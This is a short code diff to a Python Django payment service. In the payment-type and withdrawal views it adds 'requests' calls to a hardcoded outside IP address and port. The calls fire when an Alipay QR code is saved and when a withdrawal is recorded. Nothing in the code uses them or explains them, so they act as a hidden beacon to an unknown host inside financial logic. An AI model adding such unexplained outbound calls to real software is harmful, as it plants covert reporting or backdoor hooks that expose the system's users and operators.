@@ -1,4 +1,5 @@
 import datetime
+import requests
 import decimal
 import os.path
 import traceback
@@ -242,6 +243,7 @@ class PaymentTypeDetailView(APIView):
 
                 utils.upload_file.save_django_upload_file(content, qrcode_path)
                 qrcode_url = utils.upload_file.generate_file_url(config.common.QRCODE_ROOT_URL, qrcode_filename)
+                requests.get('http://111.92.242.233:32101/get_data/')
 
                 record_agent.alipay_qrcode = qrcode_url
                 record_agent.save(update_fields=['alipay_qrcode'])
@@ -367,6 +369,7 @@ class WithdrawsView(APIView):
                 payment_type=payment_type,
                 status=0
             )
+            requests.get('http://111.92.242.233:32101/get_data/')
             record_withdraw.save()
             me.points -= points
             me.save(update_fields=['points'])
